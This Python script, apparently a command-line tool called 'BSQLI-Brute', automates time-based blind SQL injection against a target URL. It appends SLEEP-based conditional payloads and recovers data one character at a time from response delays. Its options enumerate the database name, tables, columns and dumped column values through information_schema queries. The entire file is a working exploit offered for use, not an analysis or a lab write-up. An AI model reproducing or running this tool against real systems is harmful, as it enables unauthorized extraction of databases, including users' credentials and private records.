import requests
import string
import time
import argparse
import os
import sys
import platform


# Define the function to clear the screen
def clear_screen():
    if platform.system() == "Windows":
        os.system('cls')  # For Windows
    else:
        os.system('clear')  # For Linux/Unix/MacOS

# Call the function to clear the screen at the start
clear_screen()

# Characters to use for brute force
characters = string.ascii_letters + string.digits + "_@!$#{}-"

# Function to send the SQLi payload and measure the time delay
def send_sqli(url, delay, payload):
    full_url = f"{url}{payload}"  # Append the payload to the base URL
    start_time = time.time()
    
    # Send the request
    response = requests.get(full_url)
    
    # Measure the response time
    end_time = time.time()
    return end_time - start_time

# Function to extract data using time-based blind SQLi
def extract_data(url, delay, query_template, max_length=32, output_file=None):
    extracted_data = ""
    
    # Loop through character positions
    for i in range(1, max_length + 1):
        found = False
        for char in characters:
            # Create a payload to check if the current character matches
            sqli_payload = f"1 AND IF(SUBSTRING(({query_template}), {i}, 1) = '{char}', SLEEP({delay}), 0)"
            response_time = send_sqli(url, delay, sqli_payload)
            
            # If the response is delayed by the specified time, we've found the correct character
            if response_time >= delay:
                extracted_data += char
                log_output(f"Character {i} found: {char}", output_file)
                found = True
                break
        
        if not found:
            # If no character was found, assume we've reached the end of the string
            break
    
    return extracted_data

# Function to log messages to the specified output file
def log_output(message, output_file):
    if output_file:
        with open(output_file, 'a') as f:
            f.write(message + "\n")
    else:
        print(message)

# Function to print the colored ASCII banner
def print_banner():
    banner = """\u001b[36m


____________________________________    ________              _____      
___  __ )_  ___/_  __ \__  /____  _/    ___  __ )__________  ___  /_____ 
__  __  |____ \_  / / /_  /  __  /________  __  |_  ___/  / / /  __/  _ \\
_  /_/ /____/ // /_/ /_  /____/ /_/_____/  /_/ /_  /   / /_/ // /_ /  __/
/_____/ /____/ \___\_\/_____/___/       /_____/ /_/    \__,_/ \__/ \___/ 
                                                                         
    
                              
                           \u001b[32m - coded by Pintadecal\u001b[0m 
    """
    print(banner)

def main():
    # Print ASCII banner
    print_banner()

    # Custom usage string with <URL> and <DELAY>
    usage = "brute.py <URL> <DELAY> [-h] [--db] [-D DATABASE] [--table] [-T TABLE_NAME] [--column] [-C COLUMNS] [--dump] [--output-dir OUTPUT_DIR]"
    
    # Customizing the parser's usage message
    parser = argparse.ArgumentParser(usage=usage, description="Time-based Blind SQL Injection Automation")
    
    parser.add_argument('url', metavar='<URL>', type=str, help="The vulnerable URL")
    parser.add_argument('delay', metavar='<DELAY>', type=int, help="Delay time in seconds")
    parser.add_argument('--db', action='store_true', help="Get database name")
    parser.add_argument('-D', '--database', type=str, help="Database name to use")
    parser.add_argument('--table', action='store_true', help="Get table names")
    parser.add_argument('-T', '--table_name', type=str, help="Table name to use")
    parser.add_argument('--column', action='store_true', help="Get column names from a specific table")
    parser.add_argument('-C', '--columns', type=str, help="Columns to dump (comma-separated)")
    parser.add_argument('--dump', action='store_true', help="Dump data from selected columns")
    parser.add_argument('--output-dir', type=str, help="Output directory and file name for logging", default=None)

    # If no arguments are provided, show usage
    if len(sys.argv) == 1:
        parser.print_usage()
        sys.exit(1)

    args = parser.parse_args()

    url = args.url
    delay = args.delay
    output_file = args.output_dir if args.output_dir else None

    # Ensure the output directory exists if provided
    if output_file:
        os.makedirs(os.path.dirname(output_file), exist_ok=True)

    # Extract database name
    if args.db:
        log_output("Extracting database name...", output_file)
        db_name = extract_data(url, delay, "(SELECT DATABASE())", output_file=output_file)
        log_output(f"Database name: {db_name}", output_file)

    # Extract table names
    if args.table and args.database:
        log_output(f"Extracting table names from database {args.database}...", output_file)
        tables = extract_data(url, delay, f"(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{args.database}')", output_file=output_file)
        log_output(f"Tables: {tables}", output_file)

    # Extract column names from a specific table
    if args.column and args.database and args.table_name:
        log_output(f"Extracting column names from table {args.table_name} in database {args.database}...", output_file)
        columns = extract_data(url, delay, f"(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{args.table_name}' AND table_schema='{args.database}')", output_file=output_file)
        log_output(f"Columns in {args.table_name}: {columns}", output_file)

    # Dump data from selected columns
    if args.dump and args.database and args.table_name and args.columns:
        columns_list = args.columns.split(',')
        for column in columns_list:
            log_output(f"Dumping data from column {column} in table {args.table_name}...", output_file)
            data = extract_data(url, delay, f"(SELECT {column} FROM {args.table_name} LIMIT 1)", output_file=output_file)
            log_output(f"Data in column {column}: {data}", output_file)

if __name__ == "__main__":
    main()
